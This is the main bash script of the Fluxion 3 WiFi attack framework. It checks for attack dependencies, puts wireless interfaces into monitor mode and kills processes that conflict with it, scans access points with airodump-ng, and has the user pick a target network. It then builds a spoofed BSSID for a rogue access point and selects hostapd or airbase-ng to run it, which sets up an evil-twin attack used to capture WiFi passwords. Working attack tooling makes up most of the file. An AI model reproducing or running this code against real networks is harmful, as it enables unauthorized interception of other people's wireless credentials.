#!/bin/bash

################################ < FLUXION Parameters > ################################
# NOTE: The FLUXIONPath constant will not be populated correctly if the script is called
# directly via a symlink. Symlinks in the path to the script should work completely fine.
FLUXIONPath="$( cd "$(dirname "$0")" ; pwd -P )"

FLUXIONWorkspacePath="/tmp/fluxspace"
FLUXIONHashPath="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
FLUXIONScanDB="dump"

FLUXIONNoiseFloor=-90
FLUXIONNoiseCeiling=-60

FLUXIONVersion=3
FLUXIONRevision=0

FLUXIONDebug=${FLUXIONDebug:+1}
FLUXIONDropNet=${FLUXIONDropNet:+1}
FLUXIONAuto=${FLUXION_AUTO:+1}

# FLUXIONDebug [Normal Mode "" / Developer Mode 1]
export FLUXIONOutputDevice=$([ $FLUXIONDebug ] && echo "/dev/stdout" || echo "/dev/null")

FLUXIONHoldXterm=$([ $FLUXIONDebug ] && echo "-hold" || echo "")

################################# < Shell Color Codes > ################################
CRed="\e[1;31m"
CGrn="\e[1;32m"
CYel="\e[1;33m"
CBlu="\e[1;34m"
CPrp="\e[5;35m"
CCyn="\e[5;36m"
CGry="\e[0;37m"
CWht="\e[1;37m"
CClr="\e[0m"

################################ < FLUXION Parameters > ################################
FLUXIONPrompt="$CRed[${CBlu}fluxion$CYel@$CClr$HOSTNAME$CRed]-[$CYel~$CRed]$CClr "
FLUXIONVLine="$CRed[$CYel*$CRed]$CClr"

################################# < Library Includes > #################################
source lib/SandboxUtils.sh
source lib/FormatUtils.sh
source lib/IOUtils.sh
source lib/HashUtils.sh

source language/English.lang

################################ < Library Parameters > ################################
SandboxWorkspacePath="$FLUXIONWorkspacePath"
SandboxOutputDevice="$FLUXIONOutputDevice"

IOUtilsHeader="fluxion_header"
IOUtilsQueryMark="$FLUXIONVLine"
IOUtilsPrompt="$FLUXIONPrompt"

HashOutputDevice="$FLUXIONOutputDevice"

########################################################################################
if [[ $EUID -ne 0 ]]; then
	echo -e "${CRed}You don't have admin privilegies, execute the script as root.$CClr"
	exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "${CRed}The script should be exected inside a X (graphical) session.$CClr"
    exit 1
fi

function exitmode() {
	if [ ! $FLUXIONDebug ]; then
		fluxion_header

		echo -e "$CWht[$CRed-$CWht]$CRed $FLUXIONCleanupAndClosingNotice$CClr"

		local processes
		readarray processes < <(ps -A)
		
		# Currently, fluxion is only responsible for killing airodump-ng, 
		# since it uses it to scan for candidate target access points.
		# Everything else should be taken care of by the custom attack abort handler.
		local targets=("airodump-ng")

		local targetID # Program identifier/title
		for targetID in "${targets[@]}"; do
			# Get PIDs of all programs matching targetPID
			local targetPID=$(echo "${processes[@]}" | awk '$4~/'"$targetID"'/{print $1}')
			if [ ! "$targetPID" ]; then continue; fi
			echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $FLUXIONKillingProcessNotice`"
			killall $targetPID &> $FLUXIONOutputDevice
		done

		if [ "$WIAccessPoint" ]; then
			echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingExtraInterfacesNotice$CGrn $WIAccessPoint$CClr"
			iw dev $WIAccessPoint del &> $FLUXIONOutputDevice
		fi

		if [ "$WIMonitor" ]; then
			echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingMonitorNotice$CGrn $WIMonitor$CClr"
			airmon-ng stop $WIMonitor &> $FLUXIONOutputDevice
		fi

		#if [ "`cat /proc/sys/net/ipv4/ip_forward`" != "0" ]; then
		#	echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingPacketForwardingNotice$CClr"
		#	sysctl -w net.ipv4.ip_forward=0 &> $FLUXIONOutputDevice
		#fi

		#echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingCleaningIPTablesNotice$CClr"
		#if [ ! -f "$FLUXIONWorkspacePath/iptables-rules" ];then 
		#	iptables --flush 
		#	iptables --table nat --flush 
		#	iptables --delete-chain
		#	iptables --table nat --delete-chain 
		#else 
		#	iptables-restore < "$FLUXIONWorkspacePath/iptables-rules"   
		#fi

		echo -e "$CWht[$CRed-$CWht] $FLUXIONRestoringTputNotice$CClr"
		tput cnorm

		if [ ! $FLUXIONDebug ]; then
			echo -e "$CWht[$CRed-$CWht] $FLUXIONDeletingFilesNotice$CClr"
			sandbox_remove_workfile "$FLUXIONWorkspacePath/*"
		fi

		if [ $FLUXIONDropNet ]; then
			echo -e "$CWht[$CRed-$CWht] $FLUXIONRestartingNetworkManagerNotice$CClr"

			# systemctl check
			systemd=$(whereis systemctl)
			if [ "$systemd" = "" ];then
				service network-manager restart &> $FLUXIONOutputDevice &
				service networkmanager restart &> $FLUXIONOutputDevice &
				service networking restart &> $FLUXIONOutputDevice &
			else
				systemctl restart NetworkManager &> $FLUXIONOutputDevice & 	
			fi
		fi

		echo -e "$CWht[$CGrn+$CWht] $CGrn$FLUXIONCleanupSuccessNotice$CClr"
		echo -e "$CWht[$CGrn+$CWht] $CGry$FLUXIONThanksSupportersNotice$CClr"

		sleep 2

		clear
	fi

	exit
}

# Delete log only in Normal Mode !
function conditional_clear() {
	# Clear iff we're not in debug mode
	if [ ! $FLUXIONDebug ]; then clear; fi
}

function conditional_bail() {
	echo "Something went wrong, whoops!"; sleep 5
	if [ ! $FLUXIONDebug ]; then exitmode; return 0; fi
	echo "Press any key to continue execution..."
	read bullshit
}

function check_updates() {
	# Attempt to retrieve versioning information from repository script.
	local FLUXIONOnlineInfo=("`timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/fluxion.sh" 2>/dev/null | egrep "^(FLUXIONVersion|FLUXIONRevision)"`")
	
	if [ -z "${FLUXIONOnlineInfo[@]}" ]; then
		FLUXIONOnlineInfo=("version=?\n" "revision=?\n")
	fi

	echo -e "${FLUXIONOnlineInfo[@]}" > "$FLUXIONWorkspacePath/latest_version"
}

# Animation
function spinner() {
	local pid=$1
	local delay=0.15
	local spinstr='|/-\'

	tput civis
	while [ "`ps a | awk '{print $1}' | grep $pid`" ]; do
		local temp=${spinstr#?}
		printf " [%c]  " "$spinstr"
		local spinstr=$temp${spinstr%"$temp"}
		sleep $delay
		printf "\b\b\b\b\b\b"
	done

	printf "    \b\b\b\b"
	tput cnorm
}

# ERROR Report only in Developer Mode
function error_report() {
    echo "Error on line $1"
}

if [ "$FLUXIONDebug" ]; then
    trap 'error_report $LINENUM' ERR
fi

function handle_abort_attack() {
	if [ $(type -t stop_attack) ]; then
		stop_attack &> $FLUXIONOutputDevice
	else
		echo "Attack undefined, can't stop anything..." > $FLUXIONOutputDevice
	fi
}

# In case an abort signal is received,
# abort any attacks currently running.
trap handle_abort_attack SIGABRT

function handle_exit() {
	handle_abort_attack
	exitmode
}

# In case of unexpected termination, run exitmode
# to execute cleanup and reset commands.
trap handle_exit SIGINT SIGHUP

# Design
function fluxion_header() {
	format_autosize "[%*s]\n"
	local verticalBorder=$FormatAutosize

	format_autosize "[%*s${CRed}FLUXION $FLUXIONVersion    ${CRed}< F${CYel}luxion ${CRed}I${CYel}s ${CRed}T${CYel}he ${CRed}F${CYel}uture >%*s$CBlu]\n";
	local headerTextFormat="$FormatAutosize"

	conditional_clear

	echo -e "`printf "$CRed$verticalBorder" "" | sed -r "s/ /~/g"`"
	printf "$CRed$verticalBorder" ""
	printf "$headerTextFormat" "" ""
	printf "$CBlu$verticalBorder" ""
	echo -e "`printf "$CBlu$verticalBorder" "" | sed -r "s/ /~/g"`$CClr"
	echo
	echo
}

# Create working directory
if [ ! -d "$FLUXIONWorkspacePath" ]; then
    mkdir -p "$FLUXIONWorkspacePath" &> $FLUXIONOutputDevice
fi

####################################### < Start > ######################################
if [ ! $FLUXIONDebug ]; then
	FLUXIONBanner=()
	format_center " ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐"; FLUXIONBanner[${#FLUXIONBanner[@]}]="$FormatCenter";
	format_center " ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║"; FLUXIONBanner[${#FLUXIONBanner[@]}]="$FormatCenter";
	format_center " ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜"; FLUXIONBanner[${#FLUXIONBanner[@]}]="$FormatCenter";
	format_center " ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║"; FLUXIONBanner[${#FLUXIONBanner[@]}]="$FormatCenter";
	format_center " ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘"; FLUXIONBanner[${#FLUXIONBanner[@]}]="$FormatCenter";
	format_center "¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯"; FLUXIONBanner[${#FLUXIONBanner[@]}]="$FormatCenter";

	clear; echo -e "$CRed"
	for line in "${FLUXIONBanner[@]}"; do
		echo "$line"; sleep 0.1
	done
	#echo "${FLUXIONBanner[@]}"
	echo

	sleep 0.1
	format_center "${CGrn}Site: ${CRed}https://github.com/FluxionNetwork/fluxion$CClr"; echo -e "$FormatCenter"

	sleep 0.1
	format_center "${CRed}FLUXION $CWht$FLUXIONVersion (rev. $CGrn$FLUXIONRevision$CWht)$CYel by$CWht ghost"; echo -e "$FormatCenter"
	
	sleep 0.1
	FLUXIONVNotice="Online Version"
	FLUXIONVNoticeOffset=$(($(tput cols) / 2 + ((${#FLUXIONVNotice} / 2) - 4)))
	printf "%${FLUXIONVNoticeOffset}s" "Online Version"

	check_updates &
	spinner "$!"

	if [ -f "$FLUXIONWorkspacePath/latest_version" -a \
		 -s "$FLUXIONWorkspacePath/latest_version" ]; then
		mapfile FLUXIONOnlineInfo < "$FLUXIONWorkspacePath/latest_version"
		FLUXIONOnlineVersion=$(echo "${FLUXIONOnlineInfo[@]}" | awk -F= 'tolower($1)~/version/{print $2}')
		FLUXIONOnlineRevision=$(echo "${FLUXIONOnlineInfo[@]}" | awk -F= 'tolower($1)~/revision/{print $2}')
	else
		FLUXIONOnlineVersion="?"
		FLUXIONOnlineRevision="?"
	fi

	echo -e "$CClr [$CPrp$FLUXIONOnlineVersion.$FLUXIONOnlineRevision$CClr]"

    if [ ! -z "${FLUXIONOnlineVersion[@]}" -a \
			  "$FLUXIONOnlineVersion" != "?" -a \
			  "$FLUXIONOnlineRevision" != "?" ]; then
		if [ "$FLUXIONOnlineVersion" -gt "$FLUXIONVersion" -o \
			 "$FLUXIONOnlineVersion" -eq "$FLUXIONVersion" -a \
			 "$FLUXIONOnlineRevision" -gt "$FLUXIONRevision" ]; then
				echo
				echo
				echo -ne $CRed"            New revision found! "$CYel
				echo -ne "Update? [Y/n]: "$CClr
				read -N1 doupdate
				echo -ne "$CClr"
				doupdate=${doupdate:-"Y"}
			if [ "$doupdate" = "Y" ]; then
				cp $0 $HOME/flux_rev-$FLUXIONRevision.backup
				curl "https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/fluxion" -s -o $0
				echo
				echo
				echo -e ""$CRed"Updated successfully! Restarting the script to apply the changes ..."$CClr""
				sleep 3
				chmod +x $0
				exec $0
				exit
			fi
		fi
    fi
	echo
	
	sleep 1
fi

################################### < Dependencies > ###################################
function check_dependencies() {
	local CLITools=("aircrack-ng" "aireplay-ng" "airmon-ng" "airodump-ng" "airbase-ng" "awk" "curl" "dhcpd" "hostapd" "iwconfig" "lighttpd" "macchanger" "mdk3" "nmap" "php-cgi" "pyrit" "unzip" "xterm" "openssl" "rfkill" "strings" "fuser" "seq" "sed")

	local CLIToolsMissing

	for CLITool in ${CLITools[*]}; do
		# Could use parameter replacement, but requires extra variable.
		local toolIdentifier=$(printf "%-44s" "$CLITool" | sed 's/ /./g')
		local toolState=$(! hash $CLITool 2>/dev/null && echo "$CRed Missing!$CClr" || echo ".....$CGrn OK.$CClr")
		CLIToolsMissing=$([[ "$toolState" = *"Missing"* ]] && echo true)
		format_center "$FLUXIONVLine $toolIdentifier$toolState"
		echo -e "$FormatCenter"
	done

	if [ "$CLIToolsMissing" ]; then
		echo
		format_center "${CRed}Stopping due to a lack of dependencies!"; echo -e "$FormatCenter"
		echo
		exit 1
	fi

	sleep 1
}

#################################### < Resolution > ####################################
# Windows + Resolution
function set_resolution() {
	function resA() {
		TOPLEFT="-geometry 90x13+0+0"
		TOPRIGHT="-geometry 83x26-0+0"
		BOTTOMLEFT="-geometry 90x24+0-0"
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}

	function resB() {
		TOPLEFT="-geometry 92x14+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 92x36+0-0"
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}

	function resC() {
		TOPLEFT="-geometry 100x20+0+0"
		TOPRIGHT="-geometry 109x20-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}

	function resD() {
		TOPLEFT="-geometry 110x35+0+0"
		TOPRIGHT="-geometry 99x40-0+0"
		BOTTOMLEFT="-geometry 110x35+0-0"
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}

	function resE() {
		TOPLEFT="-geometry 130x43+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}

	function resF() {
		TOPLEFT="-geometry 100x17+0+0"
		TOPRIGHT="-geometry 90x27-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 90x20-0-0"
		TOPLEFTBIG="-geometry  100x70+0+0"
		TOPRIGHTBIG="-geometry 90x27-0+0"
	}

	detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)

	##  A) 1024x600
	##  B) 1024x768
	##  C) 1280x768
	##  D) 1280x1024
	##  E) 1600x1200
	case $detectedresolution in
		"1024x600" ) resA ;;
		"1024x768" ) resB ;;
		"1280x768" ) resC ;;
		"1366x768" ) resC ;;
		"1280x1024" ) resD ;;
		"1600x1200" ) resE ;;
		"1366x768"  ) resF ;;
				  * ) resA ;;
	esac
}

##################################### < Language > #####################################
function set_language() {
	if [ ! $FLUXIONAuto ]; then
		# Get all language files available.
		local languages=(language/*.lang)
		# Strip entries of "language/" and ".lang"
		languages=(${languages[@]/language\//})
		languages=(${languages[@]/.lang/})

		io_query_choice "Select your language" languages[@]

		echo

		source "$FLUXIONPath/language/$IOQueryChoice.lang"
	fi
}


#################################### < Interfaces > ####################################
function unset_interface() {
	# Unblock interfaces to make them available.
	echo -e "$FLUXIONVLine $FLUXIONUnblockingWINotice"
	rfkill unblock all

	# Find all monitor-mode interfaces & all AP interfaces.
	echo -e "$FLUXIONVLine $FLUXIONFindingExtraWINotice"
	WIMonitors=($(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}'))

	# Remove all monitor-mode & all AP interfaces.
	echo -e "$FLUXIONVLine $FLUXIONRemovingExtraWINotice"
	if [ ${#WIMonitors[@]} -gt 0 ]; then
		for monitor in ${WIMonitors[@]}; do
			# Replace interface's mon with ap & remove interface.
			iw dev ${monitor/mon/ap} del 2> $FLUXIONOutputDevice
			# Remove monitoring interface after AP interface.
			airmon-ng stop $monitor > $FLUXIONOutputDevice

			if [ $FLUXIONDebug ]; then		            
				echo -e "Stopped $monitor."
			fi
		done
	fi

	WIMonitor=""
	WIAccessPoint=""
}

# Choose Interface
function set_interface() {
	if [ "$WIMonitor" -a "$WIAccessPoint" ]; then return 0; fi

	unset_interface

	# Gather candidate interfaces.
	echo -e "$FLUXIONVLine $FLUXIONFindingWINotice"

	# Create an array with the list of all available wireless network interfaces.
	local WIAvailableData
	readarray -t WIAvailableData < <(airmon-ng | grep -P 'wl(an\d+|\w+)' | sed -r 's/[ ]{2,}|\t+/:_:/g')
	local WIAvailableDataCount=${#WIAvailableData[@]}
	local WIAvailable=()
	local WIAvailableInfo=()
	local WIAvailableColor=()

	for (( i = 0; i < WIAvailableDataCount; i++ )); do
		local data="${WIAvailableData[i]}"
		WIAvailable[i]=$(echo "$data" | awk -F':_:' '{print $2}')
		WIAvailableInfo[i]=$(echo "$data" | awk -F':_:' '{print $4}')
		if [ "`ifconfig ${WIAvailable[i]} | grep "RUNNING"`" ]; then
			WIAvailableColor[i]="$CPrp"
			WIAvailableState[i]="-"
		else
			WIAvailableColor[i]="$CClr"
			WIAvailableState[i]="+"
		fi
	done

	WIAvailable[${#WIAvailable[@]}]="$FLUXIONGeneralRepeatOption"
	WIAvailableColor[${#WIAvailableColor[@]}]="$CClr" # (Increases record count)
	WIAvailableState[${#WIAvailableState[@]}]="x"

	local WISelected
	local WISelectedState
    if [ $WIAvailableDataCount -eq 1 -a ${WIAvailableState[0]} = '+' ]; then
		WISelected="${WIAvailable[0]}"
    else
		io_query_format_fields "$FLUXIONVLine $FLUXIONInterfaceQuery" \
		"$CRed[$CYel%d$CRed]%b %-8b [%1s] %s\n" \
		WIAvailableColor[@] WIAvailable[@] WIAvailableState[@] WIAvailableInfo[@]

		echo

		WISelected="${IOQueryFormatFields[1]}"
		WISelectedState="${IOQueryFormatFields[2]}"
	fi

	if [ "$WISelected" = "$FLUXIONGeneralRepeatOption" ]; then
		unset_interface; return 1
	fi

	if [ ! "$FLUXIONDropNet" -a "$WISelectedState" = "-" ]; then
		echo -e "$FLUXIONVLine $FLUXIONSelectedBusyWIError"
		echo -e "$FLUXIONVLine $FLUXIONSelectedBusyWITip"
		sleep 7; unset_interface; return 1;
	fi

	# Get selected interface's driver details/info-descriptor.
	echo -e "$FLUXIONVLine $FLUXIONGatheringWIInfoNotice"
    WIDriver=$(airmon-ng | grep $WISelected | awk '{print $3}')

    if [ $FLUXIONDropNet ]; then
		# I'm not really sure about this conditional here.
		# FLUXION 2 had the conditional so I kept it there.
		if [ ! "$(echo $WIDriver | egrep 'rt2800|rt73')" ]; then 
			rmmod -f $WIDriver &> $FLUXIONOutputDevice 2>&1
	    fi

		# Get list of potentially troublesome programs.
		echo -e "$FLUXIONVLine $FLUXIONFindingConflictingProcessesNotice"
        ConflictPrograms=($(airmon-ng check | awk 'NR>6{print $2}'))

		# Kill potentially troublesome programs.
		echo -e "$FLUXIONVLine $FLUXIONKillingConflictingProcessesNotice"
		for program in "${ConflictPrograms[@]}"; do
                killall "$program" &> $FLUXIONOutputDevice
        done

        sleep 0.5

		# I'm not really sure about this conditional here.
		# FLUXION 2 had the conditional so I kept it there.
        if [ ! "$(echo $WIDriver | egrep 'rt2800|rt73')" ]; then
			modprobe "$WIDriver" &> $FLUXIONOutputDevice 2>&1
			sleep 0.5
    	fi
    fi
	
	run_interface
	if [ $? -ne 0 ]; then return 1; fi
}

function run_interface() {
	# Activate wireless interface monitor mode and save identifier.
	echo -e "$FLUXIONVLine $FLUXIONStartingWIMonitorNotice"
	WIMonitor=$(airmon-ng start $WISelected | awk -F'\[phy[0-9]+\]|\)' '$0~/monitor .* enabled/{print $3}' 2> /dev/null)

	# Create an identifier for the access point, AP virtual interface.
	# The identifier will follow this structure: wlanXap, where X is
	# the integer assigned to the original interface, wlanXmon.
	# In alternative systems, the strcture is: wl*ap and wl*mon.
	WIAccessPoint=${WIMonitor/mon/ap}
	
	# Create the new virtual interface with the generated identifier.
	echo -e "$FLUXIONVLine $FLUXIONStartingWIAccessPointNotice"
	if [ `iw dev $WIMonitor interface add $WIAccessPoint type monitor` ]; then
		echo -e "$FLUXIONCannotStartWIAccessPointError"
		sleep 5
		return 1		
	fi
}

###################################### < Scanner > #####################################
function set_scanner() {
	# If scanner's already been set and globals are ready, we'll skip setup.
	if [ "$APTargetSSID" -a "$APTargetChannel" -a "$APTargetEncryption" -a \
		 "$APTargetMAC" -a "$APTargetMakerID" -a "$APRogueMAC" ]; then
		return 0
	fi

	if [ $FLUXIONAuto ];then
	    run_scanner $WIMonitor
	else
		local choices=("$FLUXIONScannerChannelOptionAll" "$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption")
		io_query_choice "$FLUXIONScannerChannelQuery" choices[@]

		echo

		case "$IOQueryChoice" in
			"$FLUXIONScannerChannelOptionAll") run_scanner $WIMonitor;;
			"$FLUXIONScannerChannelOptionSpecific") set_scanner_channel;;
			"$FLUXIONGeneralBackOption") unset_interface; return 1;;
		esac
	fi

	if [ $? -ne 0 ]; then return 1; fi
}

function set_scanner_channel() {
	fluxion_header

	echo -e  "$FLUXIONVLine $FLUXIONScannerChannelQuery"
	echo
	echo -e  "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
	echo -e  "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
	echo -e  "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
	echo
	echo -ne "$FLUXIONPrompt"	

	local channels
	read channels

	echo

	run_scanner $WIMonitor $channels
	if [ $? -ne 0 ]; then return 1; fi
}

# Parameters: monitor [channel(s)]
function run_scanner() {
	echo -e "$FLUXIONVLine $FLUXIONStartingScannerNotice"

	# Remove any pre-existing scanner results.
	sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

	local monitor=$1
	local channels=$2

	if [ $FLUXIONAuto ]; then
		sleep 30 && killall xterm &
	fi

	if [ "$channels" ]; then local channelsQuery="--channel $channels"; fi

	# Begin scanner and output all results to "dump-01.csv."
	xterm $FLUXIONHoldXterm -title "$FLUXIONScannerHeader" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -at WPA $channelsQuery -w "$FLUXIONWorkspacePath/dump" $monitor

	local scannerResultsExist=$([ -f "$FLUXIONWorkspacePath/dump-01.csv" ] && echo true)
	local scannerResultsReadable=$([ -s "$FLUXIONWorkspacePath/dump-01.csv" ] && echo true)

	if [ ! "$scannerResultsReadable" ]; then
		if [ "$scannerResultsExist" ]; then
			sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
		fi

		local choices=("$FLUXIONGeneralBackOption" "$FLUXIONGeneralExitOption")
		io_query_choice "$FLUXIONScannerFailedNotice" choices[@]

		echo

		case "$IOQueryChoice" in
			"$FLUXIONGeneralBackOption") return 1;;
			"$FLUXIONGeneralExitOption") exitmode; return 2;;
		esac
	fi

	# Syntheize scan operation results from output file "dump-01.csv."
	echo -e "$FLUXIONVLine $FLUXIONPreparingScannerResultsNotice"
	# Unfortunately, mawk (alias awk) does not support the {n} times matching operator.
	# readarray TargetAPCandidates < <(gawk -F, 'NF==15 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}' $FLUXIONWorkspacePath/dump-01.csv)
	readarray TargetAPCandidates < <(awk -F, 'NF==15 && length($1)==17 && $1~/([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]/ {print $0}' "$FLUXIONWorkspacePath/dump-01.csv")
	# readarray TargetAPCandidatesClients < <(gawk -F, 'NF==7 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}' $FLUXIONWorkspacePath/dump-01.csv)
	readarray TargetAPCandidatesClients < <(awk -F, 'NF==7 && length($1)==17 && $1~/([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]/ {print $0}' "$FLUXIONWorkspacePath/dump-01.csv")

	# Cleanup the workspace to prevent potential bugs/conflicts.
	sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

	if [ ${#TargetAPCandidates[@]} -eq 0 ]; then
		sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

		echo -e "$FLUXIONVLine $FLUXIONScannerDetectedNothingNotice"
		sleep 3; return 1
	fi
}


###################################### < Target > ######################################
function unset_target_ap() {
	APTargetSSID=""
	APTargetChannel=""
	APTargetEncryption=""
	APTargetMAC=""
	APTargetMakerID=""
	APTargetMaker=""
	APRogueMAC=""
}

function set_target_ap() {
	if [ "$APTargetSSID" -a "$APTargetChannel" -a "$APTargetEncryption" -a \
		 "$APTargetMAC" -a "$APTargetMakerID" -a "$APRogueMAC" ]; then
		return 0
	fi

	unset_target_ap

	local TargetAPCandidatesMAC=()
	local TargetAPCandidatesClientsCount=()
	local TargetAPCandidatesChannel=()
	local TargetAPCandidatesSecurity=()
	local TargetAPCandidatesSignal=()
	local TargetAPCandidatesPower=()
	local TargetAPCandidatesESSID=()
	local TargetAPCandidatesColor=()

	for candidateAPInfo in "${TargetAPCandidates[@]}"; do
		candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")

		local i=${#TargetAPCandidatesMAC[@]}

		TargetAPCandidatesMAC[i]=$(echo $candidateAPInfo | cut -d , -f 1)
		TargetAPCandidatesClientsCount[i]=$(echo "${TargetAPCandidatesClients[@]}" | grep -c "${TargetAPCandidatesMAC[i]}")
		TargetAPCandidatesChannel[i]=$(echo $candidateAPInfo | cut -d , -f 4)
		TargetAPCandidatesSecurity[i]=$(echo $candidateAPInfo | cut -d , -f 6)
		TargetAPCandidatesPower[i]=$(echo $candidateAPInfo | cut -d , -f 9)
		TargetAPCandidatesESSID[i]=$(echo $candidateAPInfo | cut -d , -f 14)
		TargetAPCandidatesColor[i]=$([ ${TargetAPCandidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr)

		local power=${TargetAPCandidatesPower[i]}
		if [ $power -eq -1 ]; then
			# airodump-ng's man page says -1 means unsupported value.
			TargetAPCandidatesQuality[i]="??";
		elif [ $power -le $FLUXIONNoiseFloor ]; then
			TargetAPCandidatesQuality[i]=0;
		elif [ $power -gt $FLUXIONNoiseCeiling ]; then
			TargetAPCandidatesQuality[i]=100;
		else
			# Bash doesn't support floating point division, so I gotta work around it...
			# The function is Q = ((P - F) / (C - F)); Q - quality, P - power, F - floor, C - Ceiling.
			TargetAPCandidatesQuality[i]=$((( ${TargetAPCandidatesPower[i]} * 10 - $FLUXIONNoiseFloor * 10 ) / ( ( $FLUXIONNoiseCeiling - $FLUXIONNoiseFloor ) / 10 ) ))
		fi
	done

	local headerTitle=$(format_center "WIFI LIST"; echo -n "$FormatCenter\n\n")

	format_autosize "$CRed[$CYel * $CRed]$CClr %-*s %4s %3s %3s %2s %8s %18s\n"
	local headerFields=$(printf "$FormatAutosize" "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID")
	
	format_autosize "$CRed[$CYel%03d$CRed]%b %-*s %3s%% %3s %3d %2s %8s %18s\n"
	io_query_format_fields "$headerTitle$headerFields" "$FormatAutosize" \
						TargetAPCandidatesColor[@] \
						TargetAPCandidatesESSID[@] \
						TargetAPCandidatesQuality[@] \
						TargetAPCandidatesPower[@] \
						TargetAPCandidatesClientsCount[@] \
						TargetAPCandidatesChannel[@] \
						TargetAPCandidatesSecurity[@] \
						TargetAPCandidatesMAC[@]

	echo

	APTargetSSID=${IOQueryFormatFields[1]}
	APTargetChannel=${IOQueryFormatFields[5]}
	APTargetEncryption=${IOQueryFormatFields[6]}
	APTargetMAC=${IOQueryFormatFields[7]}
	APTargetMakerID=${APTargetSSID:0:8}
	APTargetMaker=$(macchanger -l | grep ${APTargetMakerID,,})

	# Remove any special characters allowed in WPA2 ESSIDs for normalization.
	# Removing: ' ', '[', ']', '(', ')', '*', ':'
	APTargetSSIDClean="`echo "$APTargetSSID" | sed -r 's/( |\[|\]|\(|\)|\*|:)*//g'`"

	# We'll change a single hex digit from the target AP's MAC address.
	# This new MAC address will be used as the rogue AP's MAC address.
	local APRogueMACChange=$(printf %02X $((0x${APTargetMAC:13:1} + 1)))
	APRogueMAC="${APTargetMAC::13}${APRogueMACChange:1:1}${APTargetMAC:14:4}"
}

function view_target_ap_info() {
    format_autosize "%*s$CBlu%7s$CClr: %-32b%*s\n"

	printf "$FormatAutosize" "" "ESSID" "$APTargetSSID / $APTargetEncryption" ""
	printf "$FormatAutosize" "" "Channel" "$APTargetChannel" ""
	printf "$FormatAutosize" "" "BSSID" "$APTargetMAC ($CYel${APTargetMaker:-UNKNOWN}$CClr)" ""

    echo
}


#################################### < AP Service > ####################################
function unset_ap_service() {
	APRogueService="";
}

function set_ap_service() {
	if [ "$APRogueService" ]; then return 0; fi

	unset_ap_service

	if [ $FLUXIONAuto ]; then
		# airbase-ng isn't compatible with dhcpd, since airbase-ng sets
		# the wireless interface in monitor mode, which dhcpd rejects.
		# hostapd works, because it bring the interface into master mode,
		# which dhcpd works perfecly fine with.
		APRogueService="hostapd";
	else
		fluxion_header

		echo -e "$FLUXIONVLine $FLUXIONAPServiceQuery"
		echo

		view_target_ap_info

		local choices=("$FLUXIONAPServiceHostapdOption" "$FLUXIONAPServiceAirbaseOption" "$FLUXIONGeneralBackOption")
		io_query_choice "" choices[@]

		echo

		case "$IOQueryChoice" in
			"$FLUXIONAPServiceHostapdOption" ) APRogueService="hostapd";;
			"$FLUXIONAPServiceAirbaseOption" ) APRogueService="airbase-ng";;
			"$FLUXIONGeneralBackOption" ) unset_ap_service; return 1;;
			* ) conditional_bail; return 1;;
		esac
	fi

	# AP Service: Load the service's helper routines.
